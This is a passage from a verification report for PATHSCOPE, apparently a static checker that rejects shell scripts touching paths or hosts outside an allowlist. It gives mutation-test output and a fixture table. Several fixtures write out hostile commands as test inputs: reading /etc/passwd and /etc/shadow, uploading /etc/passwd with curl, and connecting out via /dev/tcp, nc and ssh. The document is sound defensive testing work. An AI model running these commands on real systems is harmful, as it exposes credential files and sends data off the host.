   dir/escape"` is one pathname and is always recorded as one. A *consumer* may still
   split it, so the word-list reading is treated as live — one specific coverage record
   plus a row for every path-carrying word — whenever the value has more than one word and
   any word is option-shaped or any word carries `/`. A value where no word is
   option-shaped and no word carries `/` (`MSG="Permission denied"`) carries neither a
   pathname nor an argv under either reading and stays benign.
3. **Colon members.** Always applied, including when the value starts with `/`.
4. **The whole value is always a candidate.** Members are added, never substituted, so
   neither the single-pathname reading nor any member can disappear.
5. **Empty member.** An empty member exists only because a separator does. It names the
   consumer's current directory, which is the pinned PWD, so it is *resolved* to that
   directory and gets a real row — an inability to evaluate is not manufactured where the
   fact is available. A whole value that is simply empty (`X=`) is an empty scalar, not a
   one-element list, and is left alone. If PWD is unpinned the row fails closed as an
   unresolved path.
6. **Terminal disposition for every member:** endpoint, path, resolved-CWD, or `bare`.
7. **One grammar for three sites.** The assignment prefix, the `env` wrapper and the five
   declaration builtins all terminate in `record_assignment_value`. The prefix site
   matches the raw token because a quoted *name* is not an assignment in Bash either; the
   other two classify the **expanded** word, so a quoted argument cannot bypass the
   parser. A declaration operand that is neither an option, a NAME, nor NAME=VALUE after
   expansion emits a coverage record rather than being ignored.

### Disclosed residual, stated precisely

A member with **no `/`** and no option shape — a bare soname `libc.so`, a scalar `1`, a
tool name — is resolved by the consumer's own search rules and is not an argv pathname, so
it carries no row. Two further limits are disclosed rather than claimed away:

* **An option word carrying an attached pathname is not decomposed.** `-I/usr/include` or
  `ssh -i/etc/key` produces the word-list coverage record, not a row for the embedded
  path. The construct is therefore visible and fail-closed at rc 3, but the pathname
  inside the option word is not extracted. This limitation is named in the coverage
  reason text itself, so it cannot be read off as a resolved fact.
* **The union of readings is conservative, not exact.** `MSG="denied /etc/secret"` is
  rejected although no consumer opens `/etc/secret` there, and a whole-value row such as
  `/safe/bare.so:/etc/escape.so` is the single-pathname reading of a value whose list
  reading is also recorded. A fail-closed prover is allowed to over-reject; it is not
  allowed to under-report. `c2_words_with_path` records that behaviour deliberately.

### D026 falsification — the committed pre-repair bytes, then deliberate mutations

The primary RED column for every round-5 closure is the **committed round-4 blob**
`55ea3a852f7781d03d57483f554c1b8ac62007c6`, extracted and run by the harness itself
(`RED_R4.txt`). Nothing in family P11 is a prediction.

Seven single-line mutations were then applied to copies of the round-5 source **outside
the repository** (`C:\tmp\ps_final_r5\MUT_*.py`) and executed against the same fixtures.
Each mutation restores exactly one round-4 behaviour or deletes exactly one round-5
property; each is checked to have exactly one anchor in the source before it is applied.

| mutation | one-line change | property it destroys |
|---|---|---|
| **MUT-A** whole value dropped | `candidates: list[str] = [rendered]` → `= []` | the quoted-space regression guard: `/safe dir/escape` FORBID vanishes and only the two fabricated ALLOW rows remain |
| **MUT-B** no colon members | `if len(members) > 1:` → `if False:` | `c2_list_prefix`, `c3_uri_list`, `c3_empty_only_out` all fall back to `PASS rc=0` |
| **MUT-C** no word-list reading | `word_list_reading = … ` → `= False` | `c3_ws_relative` and `c3_cmdtext_noslash` fall back to `PASS rc=0` — C-3.1 and C-3.5 reopen |
| **MUT-D** round-4 URI behaviour | early `return [text]` when `URI_SCHEME_RE` matches | `c3_uri_list` and `c3_uri_pair` fall back to `PASS rc=0` — C-3.2 reopens |
| **MUT-E** empty member ignored | `if empty_member:` → `if False:` | `c3_empty_only` loses its only row and `c3_empty_only_out` falls back to `PASS rc=0` — C-3.4 reopens |
| **MUT-F** round-4 member kind | `":" not in text` restored in `assignment_member_kind` | `c3_colon_whole` falls back to `PASS rc=0` — C-3.3 reopens |
| **MUT-G** round-4 declaration gate | `continue` inserted before the expanded-operand arm | every quoted declaration falls back to `PASS rc=0` — C-4 reopens |

Measured output of the complete mutation run, verbatim:

```text
=== MUT_A / c2_quoted_space : rc repaired=3 mutant=3 DIFFERS ===
    mutant| PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
    mutant| PATH value=/safe/dir/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=X="$ROOT dir/escape"
    mutant| PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
=== MUT_B / c2_list_prefix : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_B / c3_uri_list : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_B / c3_empty_only_out : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_C / c3_ws_relative : rc repaired=3 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| PATH value=/safe/lib relative/escape.so verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_C / c3_cmdtext_noslash : rc repaired=3 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_D / c3_uri_list : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_D / c3_uri_pair : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_E / c3_empty_only : rc repaired=0 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_E / c3_empty_only_out : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_F / c3_colon_whole : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/dir/file verdict=ALLOW-LEXICAL rule=/safe/dir/file sources=BASE uses=line=2:assignment prefix
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/f sources=ROOT uses=line=2:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_G / c4_export_quoted : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_G / c4_export_quoted_space : rc repaired=3 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
=== MUT_G / c4_typeset_quoted : rc repaired=1 mutant=0 DIFFERS ===
    mutant| PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
    mutant| PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
```

MUT-A is the falsification of the **regression guard**, which has no pre-repair RED column
because round 4 already handled it correctly. The guard property is stated at row level
rather than at rc level: `c2_quoted_space` must print `PATH value=/safe dir/escape
verdict=FORBID` as one row, and must not be replaced by `/safe` plus `/safe/dir/escape`.
The repaired prover prints all three (the whole reading *and* the two word-list members)
and rejects; MUT-A prints only the two allowed members and no FORBID row at all. The rc is
3 in both because the word-list coverage record is emitted in both, so an rc comparison
would *not* discriminate here and is not offered as if it did.

### Carried fences that changed, with discriminating power

Round 5 changes the shape of ten previously carried fences — one base fixture, eight P10
fixtures and one real block — listed here in nine rows because two of them share a cause.
None loses a FORBID row; every change adds rows, adds a coverage or provenance record, or
replaces an unevaluable record with a resolved one.

| fence | round-4 | round-5 | why, and what still discriminates |
|---|---|---|---|
| `c2_quoted_space` (guard) | rc 1, one FORBID row | rc 3, same FORBID row plus `/safe`, `/safe/dir/escape` and one coverage record | the value is a multi-word value carrying `/`, which is now uniformly a live word list — the same rule that closes C-3.1. The whole-pathname reading is still recorded and still FORBID. Falsified by MUT-A above. |
| `c2_list_bare_first` | rc 1 | rc 3, adds `/safe/bare.so:/etc/escape.so` and its provenance record | C-3.3: a relative value carrying `:` is a pathname reading. `/etc/escape.so` FORBID is unchanged. Falsified by MUT-F. |
| `c2_list_space` | rc 3 | rc 3, adds the whole-value row and its provenance record | same rule; `/etc/escape.so` FORBID unchanged. Falsified by MUT-A. |
| `c2_empty_member` | rc 3 with a coverage record | rc 3, coverage record replaced by a resolved `/safe` row | C-3.4: the empty member is resolvable, so it is resolved rather than declared unevaluable. Falsified by MUT-E. |
| `c2_escaped_space` | rc 1 | rc 3, adds `/safe/a` and `/safe/b:/etc/escape` and one coverage record | the value has two words and carries `/`, so the word-list reading is live. `/etc/escape` FORBID unchanged. Falsified by MUT-C. |
| `c2_command_text` | rc 3 | rc 3, coverage reason text extended | the reason now names the undecomposed option-word limitation. `/etc/key` FORBID unchanged. |
| `c2_words_with_path` | rc 3 | rc 3, coverage reason text extended | as above; `/etc/secret` FORBID unchanged. |
| `assign_benign` and `c2_benign_scalars` (`IFS=:`) | rc 0, one row | rc 0, adds `/safe` with `sources=PWD` | C-3.4 is decided on grammar, and `IFS=:` and `LD_LIBRARY_PATH=:` are the same lexeme. The control property is that the rc does not move, and it does not. |
| `RP7-WPI-RO` with `real.constants` | rc 3 | rc 3, `unresolved_path_count` 34 → 35 | line 681 `seen_roots="$seen_roots$r "` now also yields the whole-value reading, which fails closed because `real.constants` pins no PWD. |

`RP6-P0` is **byte-identical** under round 4 and round 5.

### Regression surface of round 5

Every one of the 105 fixture cases and 4 real-block cases was run under the committed
round-4 blob and the round-5 source and compared byte for byte:

```text
total=109 identical=84 differ=25
  DIFF base   assign_benign            rc R4=0 -> R5=0
  DIFF P10    c2_list_bare_first       rc R4=1 -> R5=3
  DIFF P10    c2_list_space            rc R4=3 -> R5=3
  DIFF P10    c2_empty_member          rc R4=3 -> R5=3
  DIFF P10    c2_quoted_space          rc R4=1 -> R5=3
  DIFF P10    c2_escaped_space         rc R4=1 -> R5=3
  DIFF P10    c2_command_text          rc R4=3 -> R5=3
  DIFF P10    c2_benign_scalars        rc R4=0 -> R5=0
  DIFF P10    c2_words_with_path       rc R4=3 -> R5=3
  DIFF P11    c3_ws_relative           rc R4=0 -> R5=3
  DIFF P11    c3_ws_later_word         rc R4=0 -> R5=3
  DIFF P11    c3_uri_list              rc R4=0 -> R5=1
  DIFF P11    c3_uri_pair              rc R4=0 -> R5=1
  DIFF P11    c3_colon_whole           rc R4=0 -> R5=1
  DIFF P11    c3_empty_only            rc R4=0 -> R5=0
  DIFF P11    c3_empty_only_out        rc R4=0 -> R5=1
  DIFF P11    c3_cmdtext_noslash       rc R4=0 -> R5=3
  DIFF P11    c4_export_quoted         rc R4=0 -> R5=1
  DIFF P11    c4_export_quoted_space   rc R4=0 -> R5=3
  DIFF P11    c4_declare_quoted        rc R4=0 -> R5=1
  DIFF P11    c4_readonly_quoted       rc R4=0 -> R5=1
  DIFF P11    c4_typeset_quoted        rc R4=0 -> R5=1
  DIFF P11    c4_local_quoted          rc R4=0 -> R5=1
  DIFF P11    c4_export_opaque         rc R4=0 -> R5=3
  DIFF block  RP7-WPI-RO with real.constants rc R4=3 -> R5=3
```

All 25 differences are accounted for: the ten carried fences itemised above (1 base + 8
P10 + 1 real block) plus the 15 family-P11 fixtures whose whole point is to differ. The
other 3 P11 fixtures are the controls `c4_env_quoted_ctl`, `c4_export_plain_ctl` and
`c3_scalar_ctl`, which are byte-identical under both provers. The remaining 84 cases are
byte-identical, so the round-1, round-2, round-3 and round-4 closures are preserved rather
than re-derived — in particular all seven round-3 P9 assignment fixtures and 68 of the 69
base fixtures are byte-identical under round 4 and round 5.

## D026 RED/GREEN pairs (round 2 — see ROUND-3 AMENDMENT above; STALE)

`R1 RED` is the round-1 artefact at SHA-256 `3D6AF544…D43E6`. `R2 GREEN` is the repair.
The rows that read `rc 0 — (no row)` in the RED column are sixteen fragments exhibiting
the silent-sink pattern of CRITICAL findings 1 and 2 and the F1-EXT class found during
repair; CRITICAL findings 3 and 4 instead emit a misleading partial path. Thirteen of the
sixteen are closed in GREEN; `popd_stack`, `fddup` and `herestring` remain zero-record
because no path or endpoint is reached.

| fixture | shell fragment | finding | R1 RED | R2 GREEN |
|---|---|---|---|---|
| `green` | `leaf="$ROOT/input" ; cat "$leaf"` | round-1 GREEN, must stay GREEN | rc 0 — /safe/input ALLOW | rc 0 — /safe/input ALLOW-LEXICAL |
| `literal` | `cat /etc/passwd` | round-1 RED A, must stay RED | rc 1 — /etc/passwd FORBID | rc 1 — /etc/passwd FORBID |
| `assembled` | `p="/etc" ; q="mtc-bridge" ; cat "$p/$q/x"` | round-1 RED B, must stay RED | rc 1 — /etc/mtc-bridge/x FORBID | rc 1 — /etc/mtc-bridge/x FORBID |
| `dynamic` | `p="$(printf /safe)" ; cat "$p/x"` | round-1 RED C, must stay RED | rc 3 — (no row) | rc 3 — (no row) |
| `nested` | `unused="$(cat /etc/shadow)"` | round-1 completeness check | rc 1 — /etc/shadow FORBID | rc 1 — /etc/shadow FORBID |
| `pushd` | `pushd "$ROOT"` | F1 | rc 0 — (no row) | rc 0 — /safe ALLOW-LEXICAL |
| `pushd_forbidden` | `pushd /etc` | F1 | rc 0 — (no row) | rc 1 — /etc FORBID |
| `popd_stack` | `popd +1` | F1 | rc 0 — (no row) | rc 0 — (no row) |
| `trap` | `trap 'cat /etc/passwd' EXIT` | F1 | rc 0 — (no row) | rc 1 — /etc/passwd FORBID |
| `ssh` | `ssh "$HOST"` | F2 | rc 0 — (no row) | rc 1 — 198.51.100.10:22 FORBID |
| `ssh_command` | `ssh -p 2222 "$HOST" 'cat /etc/passwd'` | F2 | rc 0 — (no row) | rc 3 — 198.51.100.10:2222 FORBID |
| `getent` | `getent hosts "$HOST"` | F2 | rc 0 — (no row) | rc 3 — (no row) |
| `find_exec` | `find "$ROOT" -exec cat /etc/passwd \;` | F3 | rc 0 — /safe ALLOW | rc 1 — /etc/passwd FORBID; /safe ALLOW-LEXICAL |
| `find_unknown` | `find "$ROOT" -pathscope-unmodeled` | F3 | rc 0 — /safe ALLOW | rc 3 — /safe ALLOW-LEXICAL |
| `curl_upload` | `curl --upload-file=/etc/passwd "$URL"` | F4 | rc 0 — 127.0.0.1:8790 ALLOW | rc 1 — /etc/passwd FORBID; 127.0.0.1:8790 ALLOW |
| `curl_net` | `curl "$URL"` | F4 | rc 0 — 127.0.0.1:8790 ALLOW | rc 0 — 127.0.0.1:8790 ALLOW |
| `tar_option` | `tar --create --file=/etc/pathscope-evil.tar "$ROOT"` | F4 | rc 0 — /safe ALLOW | rc 1 — /etc/pathscope-evil.tar FORBID; /safe ALLOW-LEXICAL |
| `cp_option` | `cp --target-directory=/etc "$ROOT/input"` | F4 | rc 0 — /safe/input ALLOW | rc 1 — /etc FORBID; /safe/input ALLOW-LEXICAL |
| `cp_unknown` | `cp --pathscope-unmodeled=1 "$ROOT/a" "$ROOT/b"` | F4 | rc 0 — /safe/a ALLOW; /safe/b ALLOW | rc 3 — /safe/a ALLOW-LEXICAL; /safe/b ALLOW-LEXICAL |
| `python_c` | `python3 -c 'open("/etc/passwd")'` | F1-EXT | rc 0 — (no row) | rc 3 — (no row) |
| `alias` | `alias ll='cat /etc/passwd'` | F1-EXT | rc 0 — (no row) | rc 1 — /etc/passwd FORBID |
| `hash_p` | `hash -p /etc/passwd ff` | F1-EXT | rc 0 — (no row) | rc 1 — /etc/passwd FORBID |
| `mapfile_cb` | `mapfile -C 'cat /etc/passwd' -c 1 arr` | F1-EXT | rc 0 — (no row) | rc 1 — /etc/passwd FORBID |
| `systemctl_link` | `systemctl link /etc/systemd/system/evil.service` | F1-EXT | rc 0 — (no row) | rc 3 — (no row) |
| `jobs_x` | `jobs -x cat /etc/passwd` | F1-EXT | rc 0 — (no row) | rc 3 — (no row) |
| `tilde` | `cat ~/secret` | F5 | rc 3 — /safe/~/secret ALLOW | rc 3 — (no row) |
| `tilde_user` | `cat ~gatea/secret` | F5 | rc 3 — /safe/~gatea/secret ALLOW | rc 3 — (no row) |
| `tilde_home` | `cat ~/secret` | F5 | rc 3 — /safe/~/secret ALLOW | rc 1 — /home/gatea/secret FORBID |
| `symlink_lexical` | `cat "$ROOT/link/passwd"` | F6 | rc 0 — /safe/link/passwd ALLOW | rc 0 — /safe/link/passwd ALLOW-LEXICAL |
| `redir_rw` | `read x <> /etc/x` | F7 | rc 3 — /safe/> ALLOW | rc 1 — /etc/x FORBID |
| `redir_clobber` | `echo x >\| /etc/y` | coverage: redirection grammar | rc 3 — (no row) | rc 1 — /etc/y FORBID |
| `redir_amp` | `ls &> /etc/z` | coverage: redirection grammar | rc 3 — /etc/z FORBID | rc 1 — /etc/z FORBID |
| `fddup` | `exec 3>&2 ; echo hi >&2 ; exec 3>&-` | coverage: redirection grammar | rc 0 — (no row) | rc 0 — (no row) |
| `exec_redir` | `exec 3> "$ROOT/out"` | coverage: exec + redirection | rc 0 — /safe/out ALLOW | rc 0 — /safe/out ALLOW-LEXICAL |
| `devtcp` | `cat < /dev/tcp/198.51.100.10/8790` | coverage: /dev/tcp | rc 1 — /dev/tcp/198.51.100.10/8790 FORBID | rc 1 — 198.51.100.10:8790 FORBID |
| `devtcp_allow` | `cat < /dev/tcp/127.0.0.1/8790` | coverage: /dev/tcp | rc 1 — /dev/tcp/127.0.0.1/8790 FORBID | rc 3 — 127.0.0.1:8790 ALLOW |
| `heredoc` | `cat <<EOF ; /etc/passwd ; EOF` | F8 | rc 3 — (no row) | rc 0 — (no row) |
| `heredoc_subst` | `cat <<EOF ; $(cat /etc/shadow) ; EOF` | F8 | rc 3 — /etc/shadow FORBID | rc 1 — /etc/shadow FORBID |
| `heredoc_quoted` | `cat <<'EOF' ; $(cat /etc/shadow) ; EOF` | F8 | rc 3 — /etc/shadow FORBID | rc 0 — (no row) |
| `herestring` | `cat <<< "$ROOT"` | coverage: here-string | rc 0 — (no row) | rc 0 — (no row) |
| `array` | `A=(/etc/passwd) ; cat "${A[0]}"` | F8 | rc 3 — (no row) | rc 3 — (no row) |
| `brace` | `cat /safe/{a,b}` | coverage: brace expansion | rc 3 — /safe ALLOW | rc 3 — (no row) |
| `arith` | `cat "/safe/$((1+1))"` | coverage: arithmetic | rc 3 — (no row) | rc 3 — (no row) |
| `param_default` | `cat "${MISSING:-/etc/passwd}"` | coverage: ${var:-default} | rc 1 — /etc/passwd FORBID | rc 1 — /etc/passwd FORBID |
| `param_subst` | `cat "${ROOT/x/y}"` | coverage: ${var/x/y} | rc 3 — (no row) | rc 3 — (no row) |
| `ansic` | `cat $'/etc/passwd'` | coverage: $'...' | rc 1 — /etc/passwd FORBID | rc 1 — /etc/passwd FORBID |
| `continuation` | `cat \ ; "$ROOT/input"` | coverage: backslash-newline | rc 0 — /safe/input ALLOW | rc 0 — /safe/input ALLOW-LEXICAL |
| `backtick` | `unused="`cat /etc/shadow`"` | coverage: backtick substitution | rc 1 — /etc/shadow FORBID | rc 1 — /etc/shadow FORBID |
| `glob` | `cat "$ROOT"/*` | coverage: glob | rc 3 — (no row) | rc 3 — (no row) |
| `source` | `source "$ROOT/lib.sh"` | coverage: source | rc 3 — /safe/lib.sh ALLOW | rc 3 — /safe/lib.sh ALLOW-LEXICAL |
| `dot_source` | `. "$ROOT/lib.sh"` | coverage: . | rc 3 — /safe/lib.sh ALLOW | rc 3 — /safe/lib.sh ALLOW-LEXICAL |
| `xargs` | `xargs -a "$ROOT/list" cat` | coverage: xargs | rc 3 — (no row) | rc 3 — /safe/list ALLOW-LEXICAL |
| `multipath` | `install -m 0644 "$ROOT/a" /etc/b` | coverage: multi-path argv | rc 1 — /etc/b FORBID; /safe/a ALLOW | rc 1 — /etc/b FORBID; /safe/a ALLOW-LEXICAL |
| `scp_remote` | `scp "$ROOT/a" gatea@198.51.100.10:/tmp/b` | F2 | rc 3 — (no row) | rc 3 — /safe/a ALLOW-LEXICAL; 198.51.100.10:22 FORBID |
| `nc_client` | `nc "$HOST" 8790` | F2 | rc 0 — (no row) | rc 1 — 198.51.100.10:8790 FORBID |
| `grep_files` | `grep -q needle "$ROOT/f"` | coverage: registered text tool | rc 3 — (no row) | rc 0 — /safe/f ALLOW-LEXICAL |
| `sed_prog` | `sed -n 's/a/b/p' "$ROOT/f"` | coverage: opaque program text | rc 3 — (no row) | rc 3 — /safe/f ALLOW-LEXICAL |
| `func_positional` | `f() { cat "$1"; } ; f /etc/passwd` | coverage: positional dataflow | rc 3 — (no row) | rc 3 — (no row) |
| `func_body` | `g() { cat "$ROOT/ok"; } ; g` | coverage: function body | rc 0 — /safe/ok ALLOW | rc 0 — /safe/ok ALLOW-LEXICAL |
| `case_loop` | `for n in a b; do ;   case "$n" in ;     a) cat "$ROOT/a" ;; ;     *) cat /etc/other ;; ;   esac ; done` | coverage: case/for | rc 1 — /etc/other FORBID; /safe/a ALLOW | rc 1 — /etc/other FORBID; /safe/a ALLOW-LEXICAL |
| `terminal_stat` | `stat /safe/conf` | coverage: terminal rule | rc 3 — /safe/conf ALLOW | rc 3 — /safe/conf ALLOW-LEXICAL |
| `terminal_cat` | `cat /safe/conf` | coverage: terminal rule | rc 1 — /safe/conf FORBID | rc 1 — /safe/conf FORBID |

## Complete RED transcript (round-1 bytes, `3D6AF544…D43E6`)

```text
=== green ===
PATHSCOPE shell=green.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/input verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== literal ===
PATHSCOPE shell=literal.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assembled ===
PATHSCOPE shell=assembled.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/etc/mtc-bridge/x verdict=FORBID rule=- sources=NONE uses=line=4:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== dynamic ===
PATHSCOPE shell=dynamic.sh
PATHSCOPE resolved_count=0 unresolved_count=1
UNRESOLVED line=3 reason=command substitution expression="$p/x"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== nested ===
PATHSCOPE shell=nested.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== pushd ===
PATHSCOPE shell=pushd.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== pushd_forbidden ===
PATHSCOPE shell=pushd_forbidden.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== popd_stack ===
PATHSCOPE shell=popd_stack.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== trap ===
PATHSCOPE shell=trap.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== ssh ===
PATHSCOPE shell=ssh.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== ssh_command ===
PATHSCOPE shell=ssh_command.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== getent ===
PATHSCOPE shell=getent.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== find_exec ===
PATHSCOPE shell=find_exec.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:find
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== find_unknown ===
PATHSCOPE shell=find_unknown.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:find
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== curl_upload ===
PATHSCOPE shell=curl_upload.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=127.0.0.1:8790 verdict=ALLOW rule=127.0.0.1:8790 sources=URL uses=line=2:curl
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== curl_net ===
PATHSCOPE shell=curl_net.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=127.0.0.1:8790 verdict=ALLOW rule=127.0.0.1:8790 sources=URL uses=line=2:curl
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== tar_option ===
PATHSCOPE shell=tar_option.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:tar
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== cp_option ===
PATHSCOPE shell=cp_option.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/input verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cp
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== cp_unknown ===
PATHSCOPE shell=cp_unknown.sh
PATHSCOPE resolved_count=2 unresolved_count=0
PATH value=/safe/a verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cp
PATH value=/safe/b verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cp
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== python_c ===
PATHSCOPE shell=python_c.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== alias ===
PATHSCOPE shell=alias.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== hash_p ===
PATHSCOPE shell=hash_p.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== mapfile_cb ===
PATHSCOPE shell=mapfile_cb.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== systemctl_link ===
PATHSCOPE shell=systemctl_link.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== jobs_x ===
PATHSCOPE shell=jobs_x.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== tilde ===
PATHSCOPE shell=tilde.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/~/secret verdict=ALLOW rule=/safe/** sources=NONE uses=line=2:cat
UNRESOLVED line=2 reason=allowlisted path has no preregistered-constant provenance expression=~/secret
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
